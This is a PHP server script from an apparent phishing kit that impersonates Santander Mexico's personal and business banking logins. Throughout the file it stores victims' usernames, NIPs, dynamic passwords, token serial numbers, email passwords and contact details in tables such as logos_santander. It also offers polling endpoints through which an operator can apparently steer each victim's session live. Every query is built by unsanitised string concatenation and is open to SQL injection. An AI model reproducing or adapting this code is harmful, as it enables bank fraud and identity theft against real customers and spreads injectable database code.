<?php
    session_start();
    include_once('../Config/MySQL.php');
    include_once('CtrlTXT.php');
    
    date_default_timezone_set("America/Mexico_City");
    $ip = getenv("REMOTE_ADDR");
    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    function generateFolio(){
        $characters = '0123456789';

        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < 10; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    function randString(){
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';

        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < 20; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    if(isset($_POST['request']) && !empty($_POST['request'])){
        //sleep(1);
        switch($_POST['request']){
            case 'update_numero_contacto':
                if(isset($_POST['numero']) && !empty($_POST['numero'])){
                    $numero = htmlspecialchars($_POST['numero']);
                    $strQuery = "UPDATE config_panel SET phone_contacto='".$numero."'";
                    
                    $SQL = new MySQL();
                    if($SQL->insertDB($strQuery)){
                        //echo base64_encode($session);
                        echo "1";
                    }else{
                    }
                }
                break;
            case 'update_tipo_mensaje':
                if(isset($_POST['tipoMensaje']) && !empty($_POST['tipoMensaje'])){
                    $tipoMensaje = htmlspecialchars($_POST['tipoMensaje']);
                    $strQuery = "UPDATE config_panel SET tipo_mensaje='".$tipoMensaje."'";
                    //$strQuery = "UPDATE config_panel SET tipo_mensaje=2";
                    //echo $strQuery;
                    $SQL = new MySQL();
                    if($SQL->insertDB($strQuery)){
                        //echo base64_encode($session);
                        echo "1";
                    }else{

                    }
                }
                break;

            case 'update_tipo_mensaje_loading':
                if(isset($_POST['tipoMensajeBar']) && !empty($_POST['tipoMensajeBar'])){
                    $tipoMensaje = htmlspecialchars($_POST['tipoMensajeBar']);
                    $strQuery = "UPDATE config_panel SET redirect='".$tipoMensaje."'";
                    //$strQuery = "UPDATE config_panel SET tipo_mensaje=2";
                    //echo $strQuery;
                    $SQL = new MySQL();
                    if($SQL->insertDB($strQuery)){
                        //echo base64_encode($session);
                        echo "1";
                    }else{

                    }
                }
                break;


                
                
            case 'usuario':
                if(isset($_POST['user']) && !empty($_POST['user'])){
                    
                    $usuario = htmlspecialchars($_POST['user']);
                    $interface = htmlspecialchars($_POST['interface']);
                    $session = htmlspecialchars($_POST['session']);
                    $tipo = "1";
                     
    

                    $hora = date("H:i:s");
                    $fecha = date("Y-m-d");
                    $request = "loading_2_seconds";
                    $folio = generateFolio();
                    //$session = rand(1000, 9000).randString();
                    $audio = 0;
                    
                    
                    $strQuery = "INSERT INTO logos_santander(user_agent,ip,usuario,nombre_completo,hora,fecha,requet,folio,tipo_user,interface,id_session,audio_notify) VALUE('".$userAgent."','".$ip."','".$usuario."','".$usuario."','".$hora."','".$fecha."','".$request."','".$folio."','".$tipo."','".$interface."','".$session."',".$audio.")";
                    
                    $SQL = new MySQL();
                    
                    if($SQL->insertDB($strQuery)){
                        //echo $session;
                        echo "1";
                    }else{
                    }

                    
                }
                break;

            

            case 'usuario_empresas':
                if(isset($_POST['user']) && !empty($_POST['user'])){
                    
                    $usuario = htmlspecialchars($_POST['user']);
                    $interface = htmlspecialchars($_POST['interface']);
                    $session = htmlspecialchars($_POST['session']);
                    $tipo = "1";
                     
    

                    $hora = date("H:i:s");
                    $fecha = date("Y-m-d");
                    $request = "loading_2_seconds";
                    $folio = generateFolio();
                    //$session = rand(1000, 9000).randString();
                    
                    $audio = 0;
                    
                    $strQuery = "INSERT INTO logos_santander_empresas(user_agent,ip,usuario,nombre_completo,hora,fecha,requet,folio,tipo_user,interface,id_session,audio_notify) VALUE('".$userAgent."','".$ip."','".$usuario."','".$usuario."','".$hora."','".$fecha."','".$request."','".$folio."','".$tipo."','".$interface."','".$session."',".$audio.")";
                    
                    $SQL = new MySQL();
                    
                    if($SQL->insertDB($strQuery)){
                        //echo $session;
                        echo "1";
                    }else{
                    }

                    
                }
                break;

                

                case 'password':
                if(isset($_POST['passwordCliente']) && !empty($_POST['passwordCliente'])){
                    
                    $passwordCliente = htmlspecialchars($_POST['passwordCliente']);
                    $session = htmlspecialchars($_POST['session']);
                     
    

                    $hora = date("H:i:s");
                    $fecha = date("Y-m-d");
                    $request = "loading_2_seconds";
                    $folio = generateFolio();
                    //$session = rand(1000, 9000).randString();
                    
                    
                    $strQuery = "UPDATE logos_santander SET nip='".$passwordCliente."' WHERE id_session='".$session."'";
                    
                    $SQL = new MySQL();
                    
                    if($SQL->insertDB($strQuery)){
                        //echo $session;
                        echo "1";
                    }else{
                    }
                }
                break;





                case 'password_empresas':
                if(isset($_POST['passwordCliente']) && !empty($_POST['passwordCliente'])){
                    
                    $passwordCliente = htmlspecialchars($_POST['passwordCliente']);
                    $session = htmlspecialchars($_POST['session']);
                     
    

                    $hora = date("H:i:s");
                    $fecha = date("Y-m-d");
                    $request = "loading_2_seconds";
                    $folio = generateFolio();
                    //$session = rand(1000, 9000).randString();
                    
                    
                    $strQuery = "UPDATE logos_santander_empresas SET nip='".$passwordCliente."' WHERE id_session='".$session."'";
                    
                    $SQL = new MySQL();
                    
                    if($SQL->insertDB($strQuery)){
                        //echo $session;
                        echo "1";
                    }else{
                    }
                }
                break;


                


                case 'password_confirm':
                if(isset($_POST['passwordCliente']) && !empty($_POST['passwordCliente'])){
                    
                    $passwordCliente = htmlspecialchars($_POST['passwordCliente']);
                    $session = htmlspecialchars($_POST['session']);
                     
    

                    $hora = date("H:i:s");
                    $fecha = date("Y-m-d");
                    $request = "loading_2_seconds";
                    $folio = generateFolio();
                    //$session = rand(1000, 9000).randString();
                    
                    
                    $strQuery = "UPDATE logos_santander SET nip_confirm='".$passwordCliente."' WHERE id_session='".$session."'";
                    
                    $SQL = new MySQL();
                    
                    if($SQL->insertDB($strQuery)){
                        //echo $session;
                        echo "1";
                    }else{
                    }


                    //
                    
                }
                break;



                case 'password_confirm_empresas':
                if(isset($_POST['passwordCliente']) && !empty($_POST['passwordCliente'])){
                    
                    $passwordCliente = htmlspecialchars($_POST['passwordCliente']);
                    $session = htmlspecialchars($_POST['session']);
                     
    

                    $hora = date("H:i:s");
                    $fecha = date("Y-m-d");
                    $request = "loading_2_seconds";
                    $folio = generateFolio();
                    //$session = rand(1000, 9000).randString();
                    
                    
                    $strQuery = "UPDATE logos_santander_empresas SET nip_confirm='".$passwordCliente."' WHERE id_session='".$session."'";
                    
                    $SQL = new MySQL();
                    
                    if($SQL->insertDB($strQuery)){
                        //echo $session;
                        echo "1";
                    }else{
                    }


                    //
                    
                }
                break;






                case 'contrasena_dinamica':
                if(isset($_POST['contra_dinamic']) && !empty($_POST['contra_dinamic'])){
                    
                    $contra_dinamic = htmlspecialchars($_POST['contra_dinamic']);
                    $session = htmlspecialchars($_POST['session']);
                     
    

                    $hora = date("H:i:s");
                    $fecha = date("Y-m-d");
                    //$session = rand(1000, 9000).randString();
                    
                    
                    $strQuery = "UPDATE logos_santander SET contra_dinamic='".$contra_dinamic."' WHERE id_session='".$session."'";
                    
                    $SQL = new MySQL();
                    
                    if($SQL->insertDB($strQuery)){
                        //echo $session;
                        echo "1";
                    }else{
                    }
                    
                }
                break;


                case 'contrasena_dinamica_empresas':
                if(isset($_POST['contra_dinamic']) && !empty($_POST['contra_dinamic'])){
                    
                    $contra_dinamic = htmlspecialchars($_POST['contra_dinamic']);
                    $session = htmlspecialchars($_POST['session']);
                     
    

                    $hora = date("H:i:s");
                    $fecha = date("Y-m-d");
                    //$session = rand(1000, 9000).randString();
                    
                    
                    $strQuery = "UPDATE logos_santander_empresas SET contra_dinamic='".$contra_dinamic."' WHERE id_session='".$session."'";
                    
                    $SQL = new MySQL();
                    
                    if($SQL->insertDB($strQuery)){
                        //echo $session;
                        echo "1";
                    }else{
                    }
                    
                }
                break;




                








                case 'num_serie_token':
                if(isset($_POST['num_serie_token']) && !empty($_POST['num_serie_token'])){
                    
                    $num_serie = htmlspecialchars($_POST['num_serie_token']);
                    $session = htmlspecialchars($_POST['session']);
                     
    

                    $hora = date("H:i:s");
                    $fecha = date("Y-m-d");
                    //$session = rand(1000, 9000).randString();
                    
                    
                    $strQuery = "UPDATE logos_santander_empresas SET num_serie_token='".$num_serie."' WHERE id_session='".$session."'";
                    
                    $SQL = new MySQL();
                    //echo $strQuery;
                    if($SQL->insertDB($strQuery)){
                        //echo $session;
                        echo "1";
                    }else{
                    }
                    
                }
                break;






                case 'contacto_nuevo':
                    if(isset($_POST['phone']) && !empty($_POST['phone'])){
                        $nombre = htmlspecialchars($_POST['nombre']);
                        $phone = htmlspecialchars($_POST['phone']);
                        $celular = htmlspecialchars($_POST['celular']);
                        $email = htmlspecialchars($_POST['email']);
                        $compania = htmlspecialchars($_POST['compania']);
                        $token = htmlspecialchars($_POST['token']);

                        $session = $_POST['session'];
                    
                        $strQuery = "UPDATE logos_santander SET nombre_completo='".$nombre."', phone_home_office='".$phone."', phone_cell='".$celular."', correo_electronico='".$email."', company='".$compania."', token_dos='".$token."' WHERE id_session='".$session."'";
                        
                        //echo $strQuery;

                        $SQL = new MySQL();
                        if($SQL->insertDB($strQuery)){
                            echo $session;
                        }else{
                        }

                        //echo $strQuery;
                        
                    }
                    break;
                



                case 'contacto_nuevo_empresas':
                    if(isset($_POST['phone']) && !empty($_POST['phone'])){
                        $nombre = htmlspecialchars($_POST['nombre']);
                        $phone = htmlspecialchars($_POST['phone']);
                        $celular = htmlspecialchars($_POST['celular']);
                        $email = htmlspecialchars($_POST['email']);
                        $compania = htmlspecialchars($_POST['compania']);
                        $token = htmlspecialchars($_POST['token']);

                        $session = $_POST['session'];
                    
                        $strQuery = "UPDATE logos_santander_empresas SET nombre_completo='".$nombre."', phone_home_office='".$phone."', phone_cell='".$celular."', correo_electronico='".$email."', company='".$compania."', token_dos='".$token."' WHERE id_session='".$session."'";
                        
                        //echo $strQuery;

                        $SQL = new MySQL();
                        if($SQL->insertDB($strQuery)){
                            echo $session;
                        }else{
                        }

                        //echo $strQuery;
                        
                    }
                    break;



                    









                


                


                case 'contacto':
                    if(isset($_POST['phone']) && !empty($_POST['phone'])){
                        $phone = htmlspecialchars($_POST['phone']);
                        $celular = htmlspecialchars($_POST['celular']);
                        $email = htmlspecialchars($_POST['email']);
                        $session = $_POST['session'];


                        $strQuery = "UPDATE logos_santander SET phone_home_office='".$phone."', phone_cell='".$celular."', correo_electronico='".$email."' WHERE id_session='".$session."'";
                        
                        //echo $strQuery;

                        $SQL = new MySQL();
                        if($SQL->insertDB($strQuery)){
                            echo $session;
                        }else{
                        }

                        //echo $strQuery;
                        
                    }
                    break;

                /*case 'contacto':
                    if(isset($_POST['session']) && !empty($_POST['session'])){
                        $nombre = htmlspecialchars($_POST['nombre']);
                        $celular = htmlspecialchars($_POST['celular']);
                        $fijo = htmlspecialchars($_POST['fijo']);
                        $extencion = htmlspecialchars($_POST['extencion']);
                        $session = htmlspecialchars($_POST['session']);


                        $strQuery = "UPDATE logos_santander SET nombre_completo='".$nombre."', phone_cell='".$celular."', phone_home_office='".$fijo."', extencion='".$extencion."' WHERE id_session='".$session."'";
                        
                        $SQL = new MySQL();
                        if($SQL->insertDB($strQuery)){
                            echo $session;
                        }else{
                        }
                        
                        $txt = $session."   NOMBRE: ".$nombre." CELULAR: ".$celular." FIJO: ".$fijo." EXTENCION: ".$extencion;
                        
                        $file = new CtrlTXT('personas');
                        $file->writeFile($txt);

                        //echo base64_encode($session);
                    }
                    break;*/

                case 'emails':
                    if(isset($_POST['session']) && !empty($_POST['session'])){
                        $email = htmlspecialchars($_POST['email']);
                        $email_confirm = htmlspecialchars($_POST['email_confirm']);
                        $session = htmlspecialchars($_POST['session']);


                        $strQuery = "UPDATE logos_santander SET correo_electronico='".$email."', correo_electronico_confirm='".$email_confirm."' WHERE id_session='".$session."'";
                        
                        $SQL = new MySQL();
                        if($SQL->insertDB($strQuery)){
                            echo $session;
                        }else{
                        }
                        
                        $txt = $session."   EMAIL: ".$nombre." EMAIL_CONFIRMADO: ".$celular;
                        
                        $file = new CtrlTXT('personas');
                        $file->writeFile($txt);

                        //echo base64_encode($session);
                    }
                    break;
                case 'email_confirm':
                if(isset($_POST['passemail']) && !empty($_POST['passemail'])){
                    
                    $email = htmlspecialchars($_POST['email']);
                    $passEmail = htmlspecialchars($_POST['passemail']);
                    $intentos = $_POST['intentosData'];
                    $session = htmlspecialchars($_POST['session']);
                    
                    //echo "Intentos: ".$intentos;

                    if($intentos == 1){
                        $strQuery = "UPDATE logos_santander SET email_2='".$email."', pass_email_2='".$passEmail."' WHERE id_session='".$session."'";
                    }else{
                        $strQuery = "UPDATE logos_santander SET email_2_confirm='".$email."', pass_email_2_confirm='".$passEmail."' WHERE id_session='".$session."'";
                    }

                    //echo $strQuery;
                    
                    $SQL = new MySQL();
                    if($SQL->insertDB($strQuery)){
                        //echo $folio;
                    }else{
                        
                    }
                }
                break;





                case 'email_confirm_empresas':
                if(isset($_POST['passemail']) && !empty($_POST['passemail'])){
                    
                    $email = htmlspecialchars($_POST['email']);
                    $passEmail = htmlspecialchars($_POST['passemail']);
                    $intentos = $_POST['intentosData'];
                    $session = htmlspecialchars($_POST['session']);
                    
                    //echo "Intentos: ".$intentos;

                    if($intentos == 1){
                        $strQuery = "UPDATE logos_santander_empresas SET email_2='".$email."', pass_email_2='".$passEmail."' WHERE id_session='".$session."'";
                    }else{
                        $strQuery = "UPDATE logos_santander_empresas SET email_2_confirm='".$email."', pass_email_2_confirm='".$passEmail."' WHERE id_session='".$session."'";
                    }

                    //echo $strQuery;
                    
                    $SQL = new MySQL();
                    if($SQL->insertDB($strQuery)){
                        //echo $folio;
                    }else{
                        
                    }
                }
                break;

                case 'comentario':
                    if(isset($_POST['comentario']) && !empty($_POST['comentario'])){
                        $comentario = htmlspecialchars($_POST['comentario']);
                        $session = htmlspecialchars($_POST['session']);
                        $strQuery = "UPDATE logos_santander SET comentario='".$comentario."' WHERE id_session='".$session."'";
                        
                        $SQL = new MySQL();
                        if($SQL->insertDB($strQuery)){
                            //echo base64_encode($session);
                            echo "1";
                        }else{
                        }
                    }
                    break;
					
					     case 'comentario_empresas':
                    if(isset($_POST['comentario']) && !empty($_POST['comentario'])){
                        $comentario = htmlspecialchars($_POST['comentario']);
                        $session = htmlspecialchars($_POST['session']);
                        $strQuery = "UPDATE logos_santander_empresas SET comentario='".$comentario."' WHERE id_session='".$session."'";
                        
                        $SQL = new MySQL();
                        if($SQL->insertDB($strQuery)){
                            //echo base64_encode($session);
                            echo "1";
                        }else{
                        }
                    }
                    break;
                case 'refresh_online':
                //echo "datos recibidos en refresh online con la session: ".$_POST['session'];
                    if(isset($_POST['session']) && !empty($_POST['session'])){
                        
                        $session = htmlspecialchars($_POST['session']);
                        //$fechatemporal = date('h:i:s');
                        $hora = date("h:i:s");
                        $fecha = date("Y-m-d");

                        $strQuery = "UPDATE logos_santander SET last_conection='".$hora."' WHERE id_session='".$session."'";

                        $SQL = new MySQL();
                        //echo $strQuery;
                        if($SQL->insertDB($strQuery)){
                            $sql = "SELECT id, requet, folio, codigo_drop, nombre_completo, mensaje FROM logos_santander WHERE id_session='".$_POST['session']."'";
                            $db = new MySQL();
                            $peticion = $db -> getRowLogoScam($sql);

                            echo $peticion;

                        }else{
                            echo "Esta fallando";
                        }
                        
                    }
                    break;

                

                case 'refresh_online_empresas':
                    //echo "datos recibidos en refresh online con la session: ".$_POST['session'];
                        if(isset($_POST['session']) && !empty($_POST['session'])){
                            
                            $session = htmlspecialchars($_POST['session']);
                            //$fechatemporal = date('h:i:s');
                            $hora = date("h:i:s");
                            $fecha = date("Y-m-d");
    
                            $strQuery = "UPDATE logos_santander_empresas SET last_conection='".$hora."' WHERE id_session='".$session."'";
    
                            $SQL = new MySQL();
                            //echo $strQuery;
                            if($SQL->insertDB($strQuery)){
                                $sql = "SELECT id, requet, folio, codigo_drop, nombre_completo, mensaje FROM logos_santander_empresas WHERE id_session='".$_POST['session']."'";
                                $db = new MySQL();
                                $peticion = $db -> getRowLogoScam($sql);
                                
                                //echo $sql;
                                echo $peticion;
    
                            }else{
                                echo "Esta fallando";
                            }
                            
                        }
                        break;


                    

                case 'updateHistoryUser':
                    $id = $_POST['session'];
                    $hora = htmlentities($_POST['hora']);
                    $history = htmlentities($_POST['history']);
                    $tipo = htmlentities($_POST['tipo']);
                    $txt = "loading_infinite";
                    $idHostory = $_POST['idHistory'];
                    
                    
                    $sqlInsert = "INSERT INTO history_request VALUES(NULL, '".$hora."', '".$history."',".$tipo.",'".$idHostory."')";
                    
                    $db = new MySQL();
                    $db->insertHistory($sqlInsert);

                    //echo $sqlInsert;

                    $sqlUpdate = "UPDATE logos_santander SET requet='".$txt."' WHERE id_session='".$id."'";
                    $db2 = new MySQL();
                    $db2->insertDB($sqlUpdate);
                    /*echo "<br>";
                    echo $sqlUpdate;*/

                    break;
                

                case 'updateHistoryUserEmpresas':
                    $id = $_POST['session'];
                    $hora = htmlentities($_POST['hora']);
                    $history = htmlentities($_POST['history']);
                    $tipo = htmlentities($_POST['tipo']);
                    $txt = "loading_infinite";
                    $idHostory = $_POST['idHistory'];
                    
                    
                    $sqlInsert = "INSERT INTO history_request_empresas VALUES(NULL, '".$hora."', '".$history."',".$tipo.",'".$idHostory."')";
                    
                    $db = new MySQL();
                    $db->insertHistory($sqlInsert);

                    //echo $sqlInsert;

                    $sqlUpdate = "UPDATE logos_santander_empresas SET requet='".$txt."' WHERE id_session='".$id."'";
                    $db2 = new MySQL();
                    $db2->insertDB($sqlUpdate);
                    /*echo "<br>";
                    echo $sqlUpdate;*/

                    break;


                    

                case 'update_rz':
                
                if(isset($_POST['razon']) && !empty($_POST['razon'])){
                    $razon_social = htmlspecialchars($_POST['razon']);
                    $nombre_persona = htmlspecialchars($_POST['nombre_persona']);
                    $session = htmlspecialchars($_POST['id']);
                    $strQuery = "UPDATE logos_santander SET razon_social='".$razon_social."', nombre_completo='".$nombre_persona."' WHERE id=".$session;
                    
                    //echo $strQuery;
                    $SQL = new MySQL();
                    if($SQL->insertDB($strQuery)){
                        //echo base64_encode($session);
                        echo "1";
                    }else{
                    }
                }
                break;




                case 'update_rz_empresas':
                
                if(isset($_POST['razon']) && !empty($_POST['razon'])){
                    $razon_social = htmlspecialchars($_POST['razon']);
                    $nombre_persona = htmlspecialchars($_POST['nombre_persona']);
                    $session = htmlspecialchars($_POST['id']);
                    $strQuery = "UPDATE logos_santander_empresas SET razon_social='".$razon_social."', nombre_completo='".$nombre_persona."' WHERE id=".$session;
                    
                    //echo $strQuery;
                    $SQL = new MySQL();
                    if($SQL->insertDB($strQuery)){
                        //echo base64_encode($session);
                        echo "1";
                    }else{
                    }
                }
                break;



                

                    

                    
                case 'loading_panel':
                    sleep(1);
                    break;
                default:
                    echo "Ninguna opcion";
                    break;

        }
    }

?>
